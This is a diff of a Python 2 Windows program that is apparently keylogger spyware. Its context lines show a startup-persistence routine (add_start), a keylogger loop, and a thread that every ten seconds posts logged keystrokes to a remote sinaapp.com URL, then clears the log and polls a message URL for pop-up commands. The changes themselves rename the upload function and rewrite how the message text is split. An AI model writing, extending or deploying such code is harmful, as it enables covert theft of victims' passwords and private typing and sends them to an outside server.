@@ -34,29 +34,21 @@ POST_URL = 'http://xxxx.sinaapp.com/action.php'
 MSG_URL = 'http://xxxx.sinaapp.com/msgbox.txt'
 tittle = u'消息啦'
 
-def showmsg(text):
+def showmsg(user,text):
 	global old
-	if ((cmp(old,text) !=0) and (cmp(res[:t],client_id)==0)):
+	if ((cmp(old,text) !=0) and (cmp(user,client_id)==0)):
 		win32api.MessageBox(0,text,tittle,0)
 		old = text
 	else:
 		pass	
 
-def get_msg(res):
-	global t
-	t = 0
-	for i in res:
-		if i == '@':
-			break
-		t += 1
-	return(res[t+1:])
 
 def write_txt(log):
 	f = open(filename,'a+')
 	f.write(log)
 	f.close()
 
-def send_Information():
+def http_data():
 	while True:
 		time.sleep(10)
 		try:
@@ -69,16 +61,13 @@ def send_Information():
 				requests.post(POST_URL,data)
 				f = open(filename,'w')
 				f.close()
-				try:
-					res = urllib.urlopen(MSG_URL).read()
-					print 'get msgbox ok！'
-					text = get_msg(res)
-					showmsg(text)
-				except:
-					pass
-		except:
-			time.sleep(200)
-			pass
+            res = urllib.urlopen(MSG_URL).read()
+            user = res.split('@')[0]
+            text = res.split('@')[1]
+            showmsg(user,text)
+        except:
+            time.sleep(200)
+            pass
 
 def get_current_process():
     hwnd = user32.GetForegroundWindow()
@@ -131,6 +120,6 @@ def add_start(path):
 	
 if __name__=='__main__':		
 	add_start(getPath())
-	thread.start_new_thread(send_Information,())
+	thread.start_new_thread(http_data,())
 	time.sleep(1)
 	keyloger()
